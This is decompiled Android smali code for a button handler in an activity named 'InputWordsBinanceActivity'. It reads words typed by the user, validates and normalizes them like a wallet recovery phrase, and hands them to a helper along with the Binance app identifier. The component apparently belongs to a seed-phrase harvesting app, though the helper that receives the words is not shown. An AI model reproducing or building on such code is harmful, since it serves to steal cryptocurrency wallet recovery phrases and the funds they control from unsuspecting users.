.class public final Lj3/l;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/view/View$OnClickListener;


# instance fields
.field public final synthetic b:Lcom/superbock/ui/custom/InputWordsBinanceActivity;


# direct methods
.method public constructor <init>(Lcom/superbock/ui/custom/InputWordsBinanceActivity;)V
    .locals 0

    iput-object p1, p0, Lj3/l;->b:Lcom/superbock/ui/custom/InputWordsBinanceActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final onClick(Landroid/view/View;)V
    .locals 4

    iget-object v0, p0, Lj3/l;->b:Lcom/superbock/ui/custom/InputWordsBinanceActivity;

    iget-object v0, v0, Lcom/superbock/ui/custom/InputWordsBinanceActivity;->g:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    const/4 v2, 0x0

    if-eqz v1, :cond_1

    invoke-static {v0}, Lk3/j;->b(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    goto :goto_0

    :cond_0
    const-string v1, "\\s+"

    const-string v3, " "

    invoke-virtual {v0, v1, v3}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lj3/l;->b:Lcom/superbock/ui/custom/InputWordsBinanceActivity;

    const v3, 0x7f0f0057

    invoke-virtual {v1, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1}, Landroid/view/View;->getContext()Landroid/content/Context;

    move-result-object p1

    const-string v3, "com.binance.dev"

    invoke-static {v0, v3, v1, p1}, Lk3/j;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    iget-object p1, p0, Lj3/l;->b:Lcom/superbock/ui/custom/InputWordsBinanceActivity;

    const-string v0, "input_method"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/inputmethod/InputMethodManager;

    iget-object p1, p1, Lcom/superbock/ui/custom/InputWordsBinanceActivity;->g:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/view/View;->getWindowToken()Landroid/os/IBinder;

    move-result-object p1

    invoke-virtual {v0, p1, v2}, Landroid/view/inputmethod/InputMethodManager;->hideSoftInputFromWindow(Landroid/os/IBinder;I)Z

    iget-object p1, p0, Lj3/l;->b:Lcom/superbock/ui/custom/InputWordsBinanceActivity;

    iget-object p1, p1, Lcom/superbock/ui/custom/InputWordsBinanceActivity;->g:Landroid/widget/EditText;

    invoke-virtual {p1}, Landroid/view/View;->clearFocus()V

    new-instance p1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {p1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v0, Lj3/l$a;

    invoke-direct {v0, p0}, Lj3/l$a;-><init>(Lj3/l;)V

    const-wide/16 v1, 0x1f4

    invoke-virtual {p1, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :cond_1
    :goto_0
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x17

    const v1, 0x7f0f0013

    if-lt p1, v0, :cond_2

    invoke-static {}, Lcom/blankj/utilcode/util/ToastUtils;->make()Lcom/blankj/utilcode/util/ToastUtils;

    move-result-object p1

    const v0, 0x7f0c0005

    invoke-virtual {p1, v0}, Lcom/blankj/utilcode/util/ToastUtils;->setLeftIcon(I)Lcom/blankj/utilcode/util/ToastUtils;

    move-result-object p1

    const/16 v0, 0x11

    invoke-virtual {p1, v0, v2, v2}, Lcom/blankj/utilcode/util/ToastUtils;->setGravity(III)Lcom/blankj/utilcode/util/ToastUtils;

    move-result-object p1

    const-string v0, "dark"

    invoke-virtual {p1, v0}, Lcom/blankj/utilcode/util/ToastUtils;->setMode(Ljava/lang/String;)Lcom/blankj/utilcode/util/ToastUtils;

    move-result-object p1

    iget-object v0, p0, Lj3/l;->b:Lcom/superbock/ui/custom/InputWordsBinanceActivity;

    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Lcom/blankj/utilcode/util/ToastUtils;->show(Ljava/lang/CharSequence;)V

    goto :goto_1

    :cond_2
    iget-object p1, p0, Lj3/l;->b:Lcom/superbock/ui/custom/InputWordsBinanceActivity;

    invoke-virtual {p1, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/blankj/utilcode/util/ToastUtils;->showLong(Ljava/lang/CharSequence;)V

    :goto_1
    return-void
.end method
